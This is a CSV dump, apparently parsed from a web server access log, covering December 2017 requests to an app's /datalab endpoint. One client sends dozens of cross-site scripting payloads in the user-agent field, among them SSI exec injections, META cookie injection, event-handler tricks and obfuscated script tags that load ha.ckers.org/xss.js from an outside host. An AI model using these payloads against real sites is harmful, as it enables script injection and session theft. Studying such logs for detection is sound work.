"","X1","X2","X3","X4","X5","X6","X7","X8","X9","X10"
"455","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:07:34 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]--> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"456","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:15:43 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""--> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"457","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:15:43 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""--> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"458","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:15:44 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""--> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"459","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:17:43 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""--> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"460","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:19:44 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""--> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"461","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:20:07 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"462","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:20:08 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"463","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:20:08 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"464","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:22:08 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"465","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:24:09 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"466","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:24:25 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"467","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:24:25 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"468","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:24:26 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"469","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:24:30 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1763"
"470","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:24:32 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"471","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:24:32 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","4"
"472","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:24:48 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <META HTTP-EQUIV=""Set-Cookie","Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">"
"473","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:24:48 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""Set-Cookie","Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">"
"474","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:24:49 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""Set-Cookie","Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">"
"475","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:26:48 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""Set-Cookie","Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">"
"476","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:28:49 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""Set-Cookie","Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">"
"477","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:29:07 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <HEAD><META HTTP-EQUIV=""CONTENT-TYPE","CONTENT=""text/html;"
"478","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:29:08 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <HEAD><META HTTP-EQUIV=""CONTENT-TYPE","CONTENT=""text/html;"
"479","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:29:09 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <HEAD><META HTTP-EQUIV=""CONTENT-TYPE","CONTENT=""text/html;"
"480","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:31:08 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <HEAD><META HTTP-EQUIV=""CONTENT-TYPE","CONTENT=""text/html;"
"481","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:33:11 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <HEAD><META HTTP-EQUIV=""CONTENT-TYPE","CONTENT=""text/html;"
"482","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:33:36 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <SCRIPT a="">","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"483","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:33:37 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <SCRIPT a="">","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"484","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:33:37 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <SCRIPT a="">","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"485","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:33:40 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <SCRIPT a="">","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"486","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:33:40 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <SCRIPT a="">","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"487","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:33:40 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <SCRIPT a="">","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"488","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:33:57 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <SCRIPT ="">","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"489","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:33:57 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <SCRIPT ="">","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"490","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:33:57 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <SCRIPT ="">","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"491","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:33:58 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <SCRIPT ="">","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"492","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:33:59 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <SCRIPT ="">","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"493","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:33:59 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <SCRIPT ="">","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"494","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:34:17 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <SCRIPT a="">","''"
"495","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:34:18 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <SCRIPT a="">","''"
"496","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:34:18 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <SCRIPT a="">","''"
"497","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:34:22 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <SCRIPT a="">","''"
"498","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:34:22 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <SCRIPT a="">","''"
"499","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:34:22 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <SCRIPT a="">","''"
"500","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:34:39 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <SCRIPT ""a='>'","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"501","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:34:40 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <SCRIPT ""a='>'","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"502","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:34:41 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <SCRIPT ""a='>'","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"503","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:34:44 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <SCRIPT ""a='>'","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"504","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:34:44 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <SCRIPT ""a='>'","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"505","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:34:44 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <SCRIPT ""a='>'","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"506","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:35:10 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"507","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:35:11 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"508","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:35:12 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"509","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:35:15 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1207"
"510","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:35:15 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"511","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:35:15 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","9"
"512","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:35:31 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <SCRIPT a="">'>","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"513","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:35:31 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <SCRIPT a="">'>","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"514","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:35:32 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <SCRIPT a="">'>","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"515","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:37:31 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <SCRIPT a="">'>","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"516","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:39:33 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <SCRIPT a="">'>","SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"517","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:39:55 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"518","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:39:55 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"519","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:39:56 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"520","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:39:59 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","167"
"521","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:39:59 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"522","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:39:59 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","4"
"523","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:40:16 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <A HREF=""http://66.102.7.147/"">XSS</A> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"524","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:40:16 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <A HREF=""http://66.102.7.147/"">XSS</A> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"525","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:40:16 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <A HREF=""http://66.102.7.147/"">XSS</A> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"526","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:40:17 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <A HREF=""http://66.102.7.147/"">XSS</A> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","480"
"527","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:40:18 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <A HREF=""http://66.102.7.147/"">XSS</A> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"528","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:40:18 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <A HREF=""http://66.102.7.147/"">XSS</A> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","8"
"529","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:40:32 +0000","GET / HTTP/1.1",200,1040,NA,"datalab 0\""autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>""-confirm(3)-","Mozilla/5.0"
"530","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:40:32 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab 0\""autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>""-confirm(3)-","Mozilla/5.0"
"531","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:40:32 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab 0\""autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>""-confirm(3)-","Mozilla/5.0"
"532","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:40:34 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab 0\""autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>""-confirm(3)-","Mozilla/5.0"
"533","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:40:35 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab 0\""autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>""-confirm(3)-","Mozilla/5.0"
"534","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:40:35 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab 0\""autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>""-confirm(3)-","Mozilla/5.0"
"535","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:40:52 +0000","GET / HTTP/1.1",200,1040,NA,"datalab veris-->group<svg/onload=alert(/XSS/)// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"536","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:40:52 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab veris-->group<svg/onload=alert(/XSS/)// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"537","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:40:53 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab veris-->group<svg/onload=alert(/XSS/)// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"538","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:40:55 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab veris-->group<svg/onload=alert(/XSS/)// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","538"
"539","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:40:55 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab veris-->group<svg/onload=alert(/XSS/)// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"540","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:40:55 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab veris-->group<svg/onload=alert(/XSS/)// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","6"
